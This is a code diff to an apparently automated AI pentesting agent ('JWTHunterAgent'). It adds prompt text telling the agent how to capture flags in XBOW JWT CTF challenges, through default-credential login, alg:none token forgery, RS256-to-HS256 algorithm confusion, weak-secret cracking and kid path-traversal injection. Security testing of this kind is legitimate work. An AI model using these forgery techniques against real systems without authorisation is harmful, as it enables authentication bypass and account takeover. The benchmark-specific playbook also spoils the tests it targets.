@@ -197,7 +197,23 @@ Tool call: http_request { url: "https://[redacted].com/api/profile", method: "GE
 Response: 200 OK with admin data — server accepts unsigned tokens!
 
 **Step 3 — Report:**
-Tool call: report_finding { title: "JWT alg:none accepted — authentication bypass via unsigned token", severity: "critical", vulnerability_type: "jwt_none", confidence: 97 }`;
+Tool call: report_finding { title: "JWT alg:none accepted — authentication bypass via unsigned token", severity: "critical", vulnerability_type: "jwt_none", confidence: 97 }
+
+## CTF FLAG EXTRACTION (when target is an XBEN-* CTF challenge)
+
+Most XBOW JWT challenges follow this pattern: log in as a low-privilege user, get a JWT, manipulate it to become admin, then access an admin-only endpoint that returns the flag.
+
+1. **Log in first**: POST /token or /login with default creds (demo/demo, test/test). Capture the JWT from the response or Set-Cookie header.
+2. **Decode the JWT** (3 base64-url segments separated by .): execute_command { command: "echo 'JWT_HERE' | cut -d. -f2 | base64 -d 2>/dev/null" }. Look for role/is_admin/sub claims.
+3. **Forge admin token via alg:none**:
+   - header: {"alg":"none","typ":"JWT"}
+   - payload: replace user_id/role with admin's: {"sub":"admin","role":"admin","is_admin":true}
+   - signature: empty string. Final token: base64url(header) + "." + base64url(payload) + "."
+4. **Algorithm confusion (RS256 → HS256)**: fetch /.well-known/jwks.json or /jwks; extract the public key; sign HS256(payload, public_key) — many backends accept this if they don't enforce algorithm.
+5. **Weak HMAC secret cracking**: try common secrets (secret, password, key, jwt, your-256-bit-secret, the app name) via execute_command with a quick HS256 verifier loop in python3.
+6. **kid injection**: change "kid" header to ../../../../../../dev/null to make the lookup return empty bytes (then sign with empty key).
+
+Once you have the admin JWT, GET /admin or /api/users/me with Authorization: Bearer FORGED_JWT — the flag is in the response body.`;
 
 export class JWTHunterAgent implements BaseAgent {
   readonly metadata: AgentMetadata = {
